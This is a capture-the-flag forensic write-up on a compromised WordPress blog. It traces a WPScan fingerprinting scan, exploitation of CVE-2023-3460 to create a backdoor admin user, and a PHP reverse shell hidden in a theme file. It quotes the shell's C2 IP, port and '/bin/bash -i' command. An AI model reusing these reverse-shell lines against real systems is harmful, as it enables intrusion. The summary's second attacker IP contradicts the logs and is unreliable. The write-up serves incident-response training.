@@ -1,0 +1,263 @@
+Ultimatum 
+
+  
+
+One of the Forela WordPress servers was a target of notorious Threat Actors (TA). The website was running a blog dedicated to the Forela Social Club, where Forela employees can chat and discuss random topics. Unfortunately, it became a target of a threat group. The SOC team believe this was due to the blog running a vulnerable plugin. The IT admin already followed the acquisition playbook and triaged the server for the security team. Ultimately (no pun intended) it is your responsibility to investigate the incident. Step in and confirm the culprits behind the attack and restore this important service within the Forela environment. 
+
+  
+
+Artifacts given: 
+
+Docker - empty directory  
+
+Logs  - directory with 12 log files pertaining to last log, last btmp, last utmp, last-utmp dump, passwd-check, var-crash0list, var-log-list, etc all pertaining to ip 172.31.11.131 
+
+Misc - directory with 7 log files pertaining to dev-dir-files, dev-dir-files-hashes, exec-perm-files, full-timeline.csv, pot-webshell-first-1000, etc. all pertaining to ip 172.31.11.131 
+
+Persistence - directory with 7 log files pertaining to cron, systemctl services, etc. all pertaining to 172.31.11.131 
+
+Podman - empty directory 
+
+Process and Network - directory with 17 log files that shows process details, lsof, network, etc. all pertaining to 172.31.11.131 
+
+System Info - directory with 18 files that shows system information like mount, memory, usb, sudo usage, etc all pertaining to same IP above 
+
+User files - directory with 3 files and directory of the user's home and root 
+
+Virsh - empty directory 
+
+  
+
+Which security scanning tool was utilized by the attacker to fingerprint the blog website? 
+
+  
+
+Since this was a web server, we have to go to Logs > var for the apache2 web server then check the access log. 
+
+We see numerous logs similar to: 
+
+23.106.60.163 - - [08/Aug/2023:08:21:43 +0000] "HEAD /wp-config.old HTTP/1.1" 404 140 "http://3.110.136.25/" "WPScan v3.8.24 (https://wpscan.com/wordpress-security-scanner)" 
+
+  
+
+  
+
+What was the IP Address utilized by the attacker to exploit the CVE? 
+
+  
+
+Using the access.log scanning the wordpress server, it is 23.106.60.163 
+
+  
+
+Which CVE was exploited by the attacker? 
+
+  
+
+Still looking at the access.log, we see: 
+
+23.106.60.163 - - [08/Aug/2023:08:34:00 +0000] "GET /index.php/user/secragon/ HTTP/1.1" 200 14335 "-" "Secragon Offensive Agent" 
+
+23.106.60.163 - - [08/Aug/2023:08:32:40 +0000] "POST /xmlrpc.php HTTP/1.1" 200 420 "http://3.110.136.25/" "WPScan v3.8.24 (https://wpscan.com/wordpress-security-scanner)" 
+
+  
+
+Every other scan was a 404 error except the one above giving 200 message. 
+
+  
+
+198.16.74.45 - - [08/Aug/2023:08:35:12 +0000] "GET /wp-content/plugins/ultimate-member/assets/css/um-fonticons-fa.css?ver=2.6.4 HTTP/1.1" 200 5113 "http://3.110.136.25/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0" 
+
+  
+
+This shows a GET request to the plugin ultimate-member with version 2.6.4 
+
+  
+
+https://nvd.nist.gov/vuln/detail/CVE-2023-3460 
+
+The Ultimate Member WordPress plugin before 2.6.7 does not prevent visitors from creating user accounts with arbitrary capabilities, effectively allowing attackers to create administrator accounts at will. This is actively being exploited in the wild. 
+
+  
+
+  
+
+  
+
+What is the name of the backdoor user added to the blog as part of the exploitation process? 
+
+  
+
+  
+
+23.106.60.163 - - [08/Aug/2023:08:34:00 +0000] "GET /index.php/user/secragon/ HTTP/1.1" 200 14335 "-" "Secragon Offensive Agent" 
+
+23.106.60.163 - - [08/Aug/2023:08:33:59 +0000] "POST //index.php/register/ HTTP/1.1" 302 951 "-" "Secragon Offensive Agent" 
+
+  
+
+  
+
+Secragon is the backdoor user 
+
+  
+
+  
+
+After the exploit, the SOC team observed that the attacker's IP address changed and from the logs, it seems that the attacker manually explored the website after logging in. The SOC team believes that the previous IP seen during exploitation was a public cloud IP. What is the IP Address the attacker used after logging in to the site? 
+
+  
+
+198.16.74.45. We noticed this change by looking at the access.log and after Secragon was created. 
+
+  
+
+The SOC team has suspicions that the attacker added a web shell for persistent access. Confirm the full path of the web shell on the server. 
+
+  
+
+Looking at the file ~\Ultimatum\catscale_out\Misc\ip-172-31-11-131-20230808-0937-pot-webshellfirst-1000.txt , we can clearly see that contents of hidden-comments.php have been 
+
+modified to a PHP reverse shell. 
+
+  
+
+/var/www/html/wp-content/themes/twentytwentythree/patterns/hidden-comments.php 
+
+We saw this: 
+
+// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php 
+
+// Copyright (C) 2007 pentestmonkey@pentestmonkey.net 
+
+  
+
+set_time_limit (0); 
+
+$VERSION = "1.0"; 
+
+$ip = '43.204.24.76'; 
+
+$port = 6969; 
+
+  
+
+What was the value of the $shell variable in the web shell? 
+
+  
+
+  
+
+  
+
+$shell = 'uname -a; w; id; /bin/bash -i'; 
+
+  
+
+  
+
+What is the size of the webshell in bytes? 
+
+  
+
+In the Misc directory, open the full-timeline.csv as it contains the byte size 
+
+  
+
+2592 
+
+  
+
+  
+
+The SOC team believes that the attacker utilized the webshell to get RCE on the server. Can you confirm the C2 IP and Port? 
+
+  
+
+From the webshell script, we found: 
+
+$ip = '43.204.24.76'; 
+
+$port = 6969; 
+
+  
+
+SO we can conclude this is the C2 IP and Port 
+
+  
+
+  
+
+What is the process ID of the process which enabled the Threat Actor (TA) to gain hands-on access to the server? 
+
+  
+
+Go to the ss-anepo.txt, this is th eoutput of socket statistics  
+
+  
+
+43.204.24.76:6969                 users:(("bash",pid=234521,fd=12),("sh",pid=234517,fd=12),("apache2",pid=234471,fd=12)) uid:33 ino:1532880 squab <-> 
+
+tcp    LISTEN      0       511                                
+
+  
+
+234521 
+
+  
+
+  
+
+What is the name of the script/tool utilized as part of internal enumeration and finding privilege escalation paths on the server? 
+
+  
+
+  
+
+  
+
+Going back to the ~\Ultimatum\catscale_out\Misc folder and opening the -dev-dir-fileshashes.txt, we find an interesting hash alongside its associated filename. The file, 
+
+LinEnum.sh, is an open-source Linux enumeration script typically used by 
+
+penetration testers to gather system information 
+
+  
+
+  
+
+  
+
+Incident: 
+
+  
+
+Initial access into the system was done through exploiting CVE-2023-3460 which allowed a Ultimate Member WordPress plugin version before 2.6.7 to create an administrator account. 
+
+  
+
+This was found through a wpscan 3.8.24, which scanned the WordPress environment to most likely find the outdated Ultimate Member plugin. 
+
+  
+
+23.106.60.163 was the initial attacker who scanned the server and exploited the vulnerability to drop a backdoor account called secragon onto the system. 
+
+  
+
+After logging into the site and laterally moving around the system to find resources as secragon. The attacker's IP has moved via 198.16.74.75. 
+
+  
+
+Additionally, there was a webshell placed onto the WordPress server for persistence which was located in the /var/www/html/wp-content/themes/twentytwentythree/patterns/hidden-comments.php that allowed a shell back to 43.204.24.76:6969 with a PID of 234521 on the affected endpoint. This is a persistence mechanism that would allow the file to be opened and RCE access to the attacker's endpoint.  
+
+  
+
+After further investigation, the attacker has also tried to enumerate and find privilege escalation vectors through LinEnum.sh 
+
+  
+
+  
+
+ 
+
+ 
